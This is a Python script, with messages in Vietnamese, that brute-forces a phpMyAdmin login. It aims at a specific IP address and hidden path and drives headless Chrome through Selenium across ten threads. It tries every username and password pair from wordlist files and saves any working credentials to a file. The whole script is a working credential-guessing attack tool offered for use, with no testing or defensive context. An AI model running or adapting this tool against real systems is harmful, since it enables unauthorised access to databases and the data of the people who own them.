from concurrent.futures import ThreadPoolExecutor
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from tqdm import tqdm
from selenium.common.exceptions import StaleElementReferenceException, TimeoutException

user_file_path = '/Users/development/Documents/data/user.txt'

pass_file_path = '/Users/development/Documents/data/pass.txt'

login_url = 'http://20.150.196.44:888/phpmyadmin_4e340a75a3926a6e/index.php'

output_file_path = '/Users/development/Documents/data/done.txt'

with open(user_file_path, 'r') as user_file:
    usernames = user_file.read().splitlines()


with open(pass_file_path, 'r') as pass_file:
    passwords = pass_file.read().splitlines()


total_combinations = len(usernames) * len(passwords)


progress_bar = tqdm(total=total_combinations, desc='Bruteforcing', unit=' combinations')

chrome_options = Options()
chrome_options.add_argument('--headless') 


success_flag = False

def run_bruteforce(username, password):
    global success_flag

    if not success_flag:

        driver = webdriver.Chrome(options=chrome_options)

        def click_element(element):
            try:
                element.click()
            except StaleElementReferenceException:

                element = WebDriverWait(driver, 10).until(
                    EC.element_to_be_clickable((By.XPATH, '//input[@class="btn btn-primary"]'))
                )
                element.click()
        driver.get(login_url)

        username_input = driver.find_element(By.NAME, 'pma_username')
        password_input = driver.find_element(By.NAME, 'pma_password')

        username_input.send_keys(username)
        password_input.send_keys(password)


        execute_button = driver.find_element(By.XPATH, '//input[@class="btn btn-primary"]')
        click_element(execute_button)


        try:
            server_info_element = WebDriverWait(driver, 0.1).until(
                EC.presence_of_element_located((By.XPATH, '//*[@id="serverinfo"]/a'))
            )

            driver.quit()

            success_flag = True  

            progress_bar.close()

            print(f'Đăng nhập thành công!\nUsername: {username}\nPassword: {password}')


            with open(output_file_path, 'w') as output_file:
                output_file.write(f'Username: {username}\nPassword: {password}')
        except TimeoutException:

            driver.quit()
            progress_bar.update(1)
with ThreadPoolExecutor(max_workers=10) as executor:
    for username in usernames:
        for password in passwords:
            executor.submit(run_bruteforce, username, password)


progress_bar.close()

if not success_flag:
    print('Không tìm thấy kết quả.')
